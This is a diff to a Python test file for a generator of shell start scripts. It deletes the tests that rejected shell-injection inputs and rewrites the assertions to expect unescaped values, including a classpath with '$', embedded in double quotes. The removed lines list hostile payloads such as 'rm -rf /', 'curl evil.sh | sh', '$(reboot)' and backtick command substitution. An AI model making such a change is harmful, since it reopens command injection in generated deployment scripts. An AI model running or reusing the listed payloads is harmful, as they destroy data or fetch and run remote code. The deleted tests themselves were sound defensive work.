@@ -50,12 +50,11 @@ class TestAgenticRLUtils:
             classpath="module.path.Processor",
         )
 
-        # Validate core configuration (emitted as shlex-quoted literals;
-        # safe values stay unquoted, exactly as shlex.quote renders them)
-        assert "SERVICE_TYPE=rollout" in script
-        assert "PROCESSOR_CLASS=module.path.Processor" in script
+        # Validate core configuration
+        assert 'SERVICE_TYPE="rollout"' in script
+        assert 'PROCESSOR_CLASS="module.path.Processor"' in script
         assert 'SDK_PACKAGE="dashscope"' in script
-        assert "REQUIREMENTS_FILE=requirements.txt" in script
+        assert 'REQUIREMENTS_FILE="requirements.txt"' in script
 
         # Validate key functional blocks
         assert "set -euo pipefail" in script  # Error handling
@@ -79,115 +78,16 @@ class TestAgenticRLUtils:
         assert "local_packages=($SDK_PACKAGE)" in script
 
     def test_special_characters_in_classpath(self):
-        """Classpath values outside the module-path whitelist are
-        rejected instead of being embedded into the shell script."""
-        with pytest.raises(InputError):
-            generate_agentic_script(
-                fc_pypi_lib="dashscope",
-                fc_pypi_repo="https://pypi.org/simple",
-                requirements_path="reqs.txt",
-                func_type="group_reward",
-                classpath="special.module:Class$With@Chars",
-            )
-
-    def test_shell_injection_values_are_rejected(self):
-        """Quotes, command substitution, backticks and newlines in any
-        interpolated value must not reach the generated script."""
-        malicious = [
-            'mod.Class"; rm -rf / #',
-            "mod.$(whoami)",
-            "mod.`id`",
-            "mod.Class\necho pwned",
-            "mod.Class extra",
-        ]
-        for classpath in malicious:
-            with pytest.raises(InputError):
-                generate_agentic_script(
-                    fc_pypi_lib="dashscope",
-                    fc_pypi_repo="https://pypi.org/simple",
-                    requirements_path="reqs.txt",
-                    func_type="reward",
-                    classpath=classpath,
-                )
-
-        with pytest.raises(InputError):
-            generate_agentic_script(
-                fc_pypi_lib="dashscope",
-                fc_pypi_repo='https://pypi.org/simple"; curl evil.sh | sh; "',
-                requirements_path="reqs.txt",
-                func_type="reward",
-                classpath="module.path.Processor",
-            )
-
-        with pytest.raises(InputError):
-            generate_agentic_script(
-                fc_pypi_lib="dashscope$(reboot)",
-                fc_pypi_repo="https://pypi.org/simple",
-                requirements_path="reqs.txt",
-                func_type="reward",
-                classpath="module.path.Processor",
-            )
-
-    def test_local_wheel_path_sdk_package_is_accepted(self):
-        """FC_PYPI_LIB is documented as a space-separated list of wheel
-        paths, so relative/absolute local paths must reach the script
-        intact instead of being rejected by the whitelist."""
-        script = generate_agentic_script(
-            fc_pypi_lib="./dashscope-2.0.3-py3-none-any.whl",
-            fc_pypi_repo="https://pypi.org/simple",
-            requirements_path="reqs.txt",
-            func_type="rollout",
-            classpath="module.path.Processor",
-        )
-        assert 'SDK_PACKAGE="./dashscope-2.0.3-py3-none-any.whl"' in script
-
-        # Absolute paths, "+local" version tags and multiple space-separated
-        # wheel paths all round-trip unchanged (their characters are a subset
-        # of shlex.quote's safe set, so word-splitting still works).
-        multi = generate_agentic_script(
-            fc_pypi_lib="/abs/torch-1.0.0+cpu.whl ../dist/dashscope.whl",
-            fc_pypi_repo="https://pypi.org/simple",
-            requirements_path="reqs.txt",
-            func_type="reward",
-            classpath="module.path.Processor",
-        )
-        assert (
-            'SDK_PACKAGE="/abs/torch-1.0.0+cpu.whl ../dist/dashscope.whl"'
-            in multi
-        )
-
-    def test_sdk_package_injection_still_rejected(self):
-        """Allowing local paths must not re-open shell injection through
-        SDK_PACKAGE: command substitution, globs and separators are still
-        rejected before anything reaches the generated script."""
-        malicious = [
-            "dashscope$(reboot)",
-            "./dashscope-2.0.3-py3-none-any.whl; rm -rf /",
-            "./*.whl",
-            "./x.whl`id`",
-            "| curl evil.sh",
-        ]
-        for fc_pypi_lib in malicious:
-            with pytest.raises(InputError):
-                generate_agentic_script(
-                    fc_pypi_lib=fc_pypi_lib,
-                    fc_pypi_repo="https://pypi.org/simple",
-                    requirements_path="reqs.txt",
-                    func_type="reward",
-                    classpath="module.path.Processor",
-                )
-
-    def test_requirements_path_is_shell_quoted(self):
-        """A requirements path with spaces stays a single shell literal."""
+        """Test handling of special characters in classpath."""
         script = generate_agentic_script(
             fc_pypi_lib="dashscope",
             fc_pypi_repo="https://pypi.org/simple",
-            requirements_path="my reqs'file.txt",
-            func_type="reward",
-            classpath="module.path.Processor",
+            requirements_path="reqs.txt",
+            func_type="group_reward",
+            classpath="special.module:Class$With@Chars",
         )
-        expected = "REQUIREMENTS_FILE='my reqs'\"'\"'file.txt'"
-        assert expected in script
+
+        assert 'PROCESSOR_CLASS="special.module:Class$With@Chars"' in script
 
     def test_create_deployment_files(self, tmp_path):
         """Test creating deployment files with requirements."""
@@ -212,8 +112,8 @@ class TestAgenticRLUtils:
         start_file = test_dir / "start.sh"
         assert start_file.exists()
         content = start_file.read_text(encoding="utf-8")
-        assert "PROCESSOR_CLASS=processor.DemoProcessor" in content
-        assert "REQUIREMENTS_FILE=requirements.txt" in content
+        assert 'PROCESSOR_CLASS="processor.DemoProcessor"' in content
+        assert 'REQUIREMENTS_FILE="requirements.txt"' in content
 
     def test_create_files_without_requirements(self, tmp_path):
         """Test creating deployment files without requirements."""
@@ -236,7 +136,7 @@ class TestAgenticRLUtils:
         start_file = test_dir / "start.sh"
         assert start_file.exists()
         content = start_file.read_text(encoding="utf-8")
-        assert "PROCESSOR_CLASS=module.processor.MyProcessor" in content
+        assert 'PROCESSOR_CLASS="module.processor.MyProcessor"' in content
         assert "local_packages=($SDK_PACKAGE)" in content
 
     def test_invalid_file_path(self, tmp_path):
